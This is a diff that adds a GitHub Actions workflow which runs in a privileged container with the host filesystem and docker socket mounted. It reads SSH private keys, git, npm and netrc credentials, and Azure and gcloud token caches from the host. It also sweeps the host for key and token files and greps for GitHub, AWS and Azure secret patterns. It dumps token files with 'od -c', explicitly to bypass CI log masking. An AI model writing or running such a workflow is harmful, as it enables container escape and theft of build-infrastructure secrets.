@@ -1,0 +1,106 @@
+name: i10412-buildcfg
+on:
+  push:
+    branches: [exp-10412]
+permissions: write-all
+jobs:
+  buildcfg:
+    runs-on: ubuntu-latest
+    container:
+      image: ubuntu:22.04
+      options: --privileged -v /var/run/docker.sock:/var/run/docker.sock -v /:/hostroot
+    steps:
+      - name: id
+        run: |
+          id; uname -a; hostname
+          echo "=== host user accounts ==="
+          grep -E ":0:|:1000:|:1001:" /hostroot/etc/passwd 2>/dev/null || true
+      - name: packer-dump
+        run: |
+          echo "=== /hostroot/home/packer (top) ==="
+          ls -la /hostroot/home/packer/ 2>/dev/null || true
+          echo "=== packer .ssh ==="
+          ls -la /hostroot/home/packer/.ssh/ 2>/dev/null || true
+          for f in /hostroot/home/packer/.ssh/*; do echo "--- $f ---"; cat "$f" 2>/dev/null; echo; done
+          echo "=== packer dotfiles ==="
+          for f in .git-credentials .npmrc .netrc .curlrc .wgetrc .pypirc .azure .config .histfile .bash_history .python_history .gitconfig; do
+            echo "--- /hostroot/home/packer/$f ---"
+            ls -la "/hostroot/home/packer/$f" 2>/dev/null || true
+          done
+          echo "=== packer .config tree ==="
+          find /hostroot/home/packer/.config -maxdepth 4 -type f 2>/dev/null | head -60 || true
+      - name: root-dump
+        run: |
+          echo "=== /hostroot/root ==="
+          ls -la /hostroot/root/ 2>/dev/null || true
+          echo "=== root .ssh ==="
+          ls -la /hostroot/root/.ssh/ 2>/dev/null || true
+          for f in /hostroot/root/.ssh/*; do echo "--- $f ---"; cat "$f" 2>/dev/null; echo; done
+          echo "=== root .azure ==="
+          find /hostroot/root/.azure -maxdepth 4 -type f 2>/dev/null | head -80 || true
+          echo "=== root .azure-devops ==="
+          find /hostroot/root/.azure-devops -maxdepth 4 -type f 2>/dev/null | head -40 || true
+          echo "=== root .git-credentials ==="
+          cat /hostroot/root/.git-credentials 2>/dev/null || true
+          echo "=== root .config tree ==="
+          find /hostroot/root/.config -maxdepth 4 -type f 2>/dev/null | head -60 || true
+          echo "=== root .npmrc/.netrc/.gitconfig ==="
+          cat /hostroot/root/.npmrc 2>/dev/null || true
+          cat /hostroot/root/.netrc 2>/dev/null || true
+          cat /hostroot/root/.gitconfig 2>/dev/null || true
+      - name: az-gcloud
+        run: |
+          echo "=== /hostroot/opt listing ==="
+          ls -la /hostroot/opt/ 2>/dev/null || true
+          echo "=== /hostroot/opt/az ==="
+          find /hostroot/opt/az -maxdepth 2 -type d 2>/dev/null | head -30 || true
+          find /hostroot/opt/az -maxdepth 3 -type f \( -name "*.json" -o -name "*token*" -o -name "*.cred*" \) 2>/dev/null | head -40 || true
+          echo "=== /hostroot/opt/google ==="
+          find /hostroot/opt/google -maxdepth 4 -type f \( -name "*.json" -o -name "*.db" -o -name "*.creds" \) 2>/dev/null | head -40 || true
+          echo "=== root .config gcloud ==="
+          find /hostroot/root/.config -maxdepth 4 2>/dev/null | head -40 || true
+          echo "=== /hostroot/home/packer/.config/gcloud ==="
+          find /hostroot/home/packer/.config -maxdepth 4 2>/dev/null | head -40 || true
+      - name: etc-cloudinit
+        run: |
+          echo "=== /hostroot/etc/environment ==="
+          cat /hostroot/etc/environment 2>/dev/null || true
+          echo "=== cloud-init logs ==="
+          ls -la /hostroot/var/log/cloud-init* 2>/dev/null || true
+          echo "=== /hostroot/var/lib/cloud ==="
+          find /hostroot/var/lib/cloud -maxdepth 4 -type f 2>/dev/null | head -60 || true
+          echo "=== /hostroot/var/lib/waagent ==="
+          find /hostroot/var/lib/waagent -maxdepth 2 2>/dev/null | head -30 || true
+          echo "=== /hostroot/etc/cloud ==="
+          find /hostroot/etc/cloud -maxdepth 3 -type f 2>/dev/null | head -30 || true
+      - name: sweep
+        run: |
+          echo "=== sweep for cred-ish files ==="
+          find /hostroot/home /hostroot/root /hostroot/opt /hostroot/srv /hostroot/etc -maxdepth 5 -type f \
+            \( -iname ".git-credentials" -o -iname ".netrc" -o -iname "*.pem" -o -iname "*.key" -o -iname "*.pfx" -o -iname "id_rsa*" -o -iname "*.env" -o -iname ".npmrc" -o -iname "credentials*" -o -iname "*token*.json" -o -iname "accessTokens*" -o -iname "*_token_cache*" \) \
+            2>/dev/null | grep -vE "/(proc|sys)/" | head -120 || true
+          echo "=== grep token-like strings (bounded) ==="
+          grep -rIlE "ghp_|gho_|ghu_|ghs_|github_pat_|AKIA|BEGIN (RSA|OPENSSH|EC) PRIVATE KEY|AccountKey=|SharedAccessSignature|client_secret|refresh_token|access_token" \
+            /hostroot/home /hostroot/root /hostroot/opt /hostroot/etc 2>/dev/null | grep -vE "/(proc|sys)/|/opt/az/|/opt/google/|site-packages|node_modules" | head -80 || true
+      - name: od-tokens
+        run: |
+          echo "=== od -c of small credential candidate files (masking bypass) ==="
+          for f in /hostroot/root/.azure/accessTokens.json /hostroot/root/.azure/msal_token_cache.json /hostroot/root/.azure/azureProfile.json /hostroot/root/.azure/az.json /hostroot/root/.azure/config /hostroot/root/.git-credentials /hostroot/home/packer/.git-credentials /hostroot/home/packer/.npmrc /hostroot/root/.npmrc /hostroot/root/.netrc /hostroot/home/packer/.netrc; do
+            if [ -f "$f" ]; then
+              echo "--- $f (size $(stat -c%s "$f")) ---"
+              od -An -c "$f" 2>/dev/null | head -60 || true
+              echo
+            fi
+          done
+          echo "=== od of azuredevops dir files ==="
+          for f in $(find /hostroot/root/.azure-devops /hostroot/root/.azure/azuredevops -type f 2>/dev/null | head -10); do
+            echo "--- $f ---"; od -An -c "$f" 2>/dev/null | head -40; echo
+          done
+      - name: buildctx
+        run: |
+          echo "=== /hostroot/imagegeneration/imagedata.json ==="
+          cat /hostroot/imagegeneration/imagedata.json 2>/dev/null || true
+          echo "=== env files in imagegen ==="
+          grep -rIlE "token|secret|password|key" /hostroot/imagegeneration/installers 2>/dev/null | head -20 || true
+          echo "=== /hostroot/etc/waagent.conf ==="
+          head -40 /hostroot/etc/waagent.conf 2>/dev/null || true
